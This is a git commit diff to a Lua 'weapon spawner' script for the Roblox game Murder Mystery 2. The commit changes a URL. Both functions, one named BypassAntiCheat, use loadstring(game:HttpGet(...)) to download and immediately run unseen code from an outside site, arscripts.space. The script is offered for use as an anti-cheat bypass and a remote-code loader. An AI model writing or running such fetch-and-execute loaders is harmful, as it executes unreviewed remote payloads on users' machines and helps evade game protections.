bdbb772e75a4773fe38ba0eac6229df55d98e46f
LOGIC <120298843+AAstraX@users.noreply.github.com>
2025-03-06 20:23:06 +0800

    Update mm2.lua

--- MM2WeaponSpawnerScript/mm2.lua
+++ MM2WeaponSpawnerScript/mm2.lua
@@ -2,7 +2,7 @@ local function BypassAntiCheat()
         loadstring(game:HttpGet("https://arscripts.space/MM2SCRIPT"))()
 end
 local function MM2Spawner()
-        loadstring(game:HttpGet("https://arscripts.space/MM2WeaponSpawnerScript", true))()
+        loadstring(game:HttpGet("https://arscripts.space/MM2WeaponSpawnerScript/MM2SCRIPT.lua", true))()
 end
 task.spawn(BypassAntiCheat)
 task.spawn(MM2Spawner)
